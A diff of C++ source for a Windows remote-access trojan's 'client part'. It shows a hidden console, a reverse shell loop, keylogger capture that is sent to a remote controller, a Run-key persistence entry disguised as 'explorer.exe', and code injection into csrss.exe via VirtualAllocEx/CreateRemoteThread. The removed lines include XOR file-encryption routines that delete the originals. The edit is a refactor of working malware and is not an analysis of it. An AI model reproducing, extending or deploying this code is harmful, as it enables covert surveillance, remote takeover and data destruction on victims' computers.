@@ -8,46 +8,46 @@
  * client part
 */
 
+
 #include <winsock2.h>
 #include <windows.h>
-#include <wincrypt.h>
-#include <tlhelp32.h>
-#include <stdlib.h>
+//#include <stdlib.h>
 #include <fstream>
-#include <cstring>
-#include <tchar.h>
-#include <process.h>
-#include <limits.h>
+//#include <process.h>
+//#include <limits.h>
 #include <string>
-#include <vector>
-#include <cstdlib>
+//#include <cstdlib>
 
+#include <vector>
+#include <tlhelp32.h>
+
+#include "Autorun.h"
 #include "Config.h"
 #include "Server.h"
+#include "Crypt.h"
+//#include "Utils.h"
 #include "Keylogger.h"
 
-using std::exit;
-using std::vector;
-
-#pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "ntdll.lib")
-#pragma comment(linker,"/BASE:0x13140000")
+//#pragma comment(lib, "ws2_32.lib")
+//#pragma comment(lib, "ntdll.lib")
+//#pragma comment(linker,"/BASE:0x13140000")
 
 #pragma warning(disable: 4996)
 
+using std::vector;
 
-std::string buf_file;
-std::string loc_buf_file;
-std::string buf, rbuf, key_ret, keydel, rkeydel;
-std::string CryptFile(std::string path, int key);
-std::string CryptDir(std::string path, int key);
+std::string readFile(const std::string fileName) {
+	std::ifstream f(fileName);
+	f.seekg(0, std::ios::end);
+	size_t size = f.tellg();
+	std::string s(size, ' ');
+	f.seekg(0);
+	f.read(&s[0], size);
+	return s;
+}
 
-std::string keylog_path;
-std::string chars;
-
-
-std::wstring string_to_wstring(std::string& s)
-{
+/*
+std::wstring string_to_wstring(std::string& s) {
 	std::ofstream ofs("temp.txt", std::ofstream::out);
 	if (!ofs) exit(1);
 	ofs << s;
@@ -58,11 +58,11 @@ std::wstring string_to_wstring(std::string& s)
 	if (!wifs) exit(1);
 	wifs >> s1;
 	wifs.close();
+	system("del temp.txt");
 	return s1;
 }
 
-std::string wstring_to_string(std::wstring s)
-{
+std::string wstring_to_string(std::wstring s) {
 	std::wofstream wofs("temp.txt", std::wofstream::out);
 	if (!wofs) exit(1);
 	wofs << s;
@@ -73,7 +73,18 @@ std::string wstring_to_string(std::wstring s)
 	if (!ifs) exit(1);
 	ifs >> s1;
 	ifs.close();
+	system("del temp.txt");
 	return s1;
+}
+
+std::string readFile(const std::string fileName) {
+	std::ifstream f(fileName);
+	f.seekg(0, std::ios::end);
+	size_t size = f.tellg();
+	std::string s(size, ' ');
+	f.seekg(0);
+	f.read(&s[0], size);
+	return s;
 }
 
 vector<std::string> scandir(std::string p) {
@@ -94,78 +105,7 @@ vector<std::string> scandir(std::string p) {
 
 	return v;
 }
-
-
-std::string readFile(const std::string fileName) {
-	std::ifstream f(fileName);
-	f.seekg(0, std::ios::end);
-	size_t size = f.tellg();
-	std::string s(size, ' ');
-	f.seekg(0);
-	f.read(&s[0], size);
-	return s;
-}
-
-BOOL RegisterStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
-{
-	HKEY hKey = NULL;
-	LONG lResult = 0;
-	BOOL fSuccess = TRUE;
-	DWORD dwSize;
-
-	const size_t count = MAX_PATH * 2;
-	wchar_t szValue[count] = {};
-
-
-	wcscpy_s(szValue, count, L"\"");
-	wcscat_s(szValue, count, pathToExe);
-	wcscat_s(szValue, count, L"\" ");
-
-	if (args != NULL) wcscat_s(szValue, count, args);
-	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
-	fSuccess = (lResult == 0);
-
-	if (fSuccess) {
-		dwSize = (wcslen(szValue) + 1) * 2;
-		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
-		fSuccess = (lResult == 0);
-	}
-	if (hKey != NULL) {
-		RegCloseKey(hKey);
-		hKey = NULL;
-	}
-	return fSuccess;
-}
-
-void RegisterProgram()
-{
-	wchar_t szPathToExe[MAX_PATH];
-	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
-	RegisterStartup(L"explorer.exe", szPathToExe, L"-foobar");
-}
-
-DWORD WINAPI func(LPVOID)
-{
-	LoadLibrary((LPCWSTR)"kernel32.dll");
-	LoadLibrary((LPCWSTR)"user32.dll");
-	return true;
-}
-
-BOOL Inject(HANDLE hProc, DWORD(WINAPI* func)(LPVOID))
-{
-	DWORD id;
-	DWORD ByteOfWriten;
-	HMODULE hModule = GetModuleHandle(NULL);
-	DWORD size = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE*)(hModule)+((PIMAGE_DOS_HEADER)(hModule))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;
-	char* hNewModule = (char*)VirtualAllocEx(hProc, hModule, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (hNewModule == NULL) return false;
-	WriteProcessMemory(hProc, hNewModule, hModule, size, &ByteOfWriten);
-	if (ByteOfWriten != size) return false;
-	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, func, (LPVOID)hNewModule, 0, &id);
-	if (hThread == 0) return false;
-	return true;
-}
-
+*/
 DWORD GetProcessID(const char* lpNameProcess)
 {
 	HANDLE snap;
@@ -184,7 +124,8 @@ DWORD GetProcessID(const char* lpNameProcess)
 	return 0;
 }
 
-BOOL(WINAPI* RegisterServiceProcess)(DWORD dwProcessId, DWORD dwType);
+
+std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars;
 
 
 int Shell(SOCKADDR_IN addr) {
@@ -297,7 +238,7 @@ int Shell(SOCKADDR_IN addr) {
 			memset(&path, 0x0, sizeof(path));
 			keylog_path = getenv("LOCALAPPDATA") + std::string("\\");
 			recv(conn, path, sizeof(path), NULL);
-			while (buf.length() < atoi(path)+7 && rbuf.length() < atoi(path)+7) {
+			while (buf.length() < unsigned int(atoi(path)+7) && rbuf.length() < unsigned int(atoi(path)+7)) {
 				keylogger(keylog_path);
 				buf = readFile(keylog_path + "keylog.txt");
 				rbuf = readFile(keylog_path + "keylogru.txt");
@@ -342,6 +283,7 @@ int Shell(SOCKADDR_IN addr) {
 int main() {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	setlocale(LC_ALL, "Russian");
+	// autorun
 	RegisterProgram();
 	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);
 
@@ -357,37 +299,5 @@ int main() {
 	return 0;
 }
 
-std::string CryptFile(std::string path, int key) {
-	try {
-		std::string data = readFile(path), delcmd = "del " + path, cryptdata;
-		for (int item = 0; item < data.length(); ++item)
-			cryptdata += data[item] ^ key;
 
-		std::ofstream crfile(path + ".crypt");
-		for (int item = 0; item < cryptdata.length(); ++item)
-			crfile << cryptdata[item];
-
-		crfile.close();
-		system(delcmd.c_str());
-		return "crypt " + path + " ok";
-	}
-	catch (...) {
-		return "crypt " + path + " failed";
-	}
-}
-
-std::string CryptDir(std::string path, int key) {
-	std::string buf;
-	vector<std::string> v;
-	v = scandir(path+"*");
-	for (int i = 0; i < v.size(); i++) {
-		try {
-			CryptFile(path + v[i], key);
-			buf += "crypt " + path + v[i] + " ok\n";
-		}
-		catch (...) {
-			continue;
-		}
-	}
-	return buf;
-}
+// start kurva
